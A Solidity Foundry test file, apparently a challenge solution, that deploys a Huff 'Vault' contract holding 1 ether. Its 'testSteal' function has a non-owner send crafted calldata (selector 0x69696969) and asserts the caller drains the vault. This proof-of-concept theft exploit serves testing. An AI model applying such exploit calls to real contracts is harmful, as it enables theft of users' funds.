// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract VaultTest is Test {
    IVault public vault;

    /// @dev Setup the testing environment.
    function setUp() public {
        deal(address(this), 1e18);
        vault = IVault(
            HuffDeployer.config().with_value(1e18).deploy{value: 1e18}("Vault")
        );
    }

    function testSteal() public {
        // non-owner will now steal it
        deal(address(1), 1);
        uint256 vaultBalance = address(vault).balance;
        vm.startPrank(address(1));
        bytes memory data = abi.encodeWithSelector(bytes4(0x69696969), 0x46);
        (bool success, ) = address(vault).call{value: 1}(data);
        assertEq(vaultBalance, address(1).balance - 1);
    }
}

interface IVault {
    function owner() external returns (address);

    function setOwner(address) external returns (bool);

    function deposit() external;

    function withdraw() external;
}
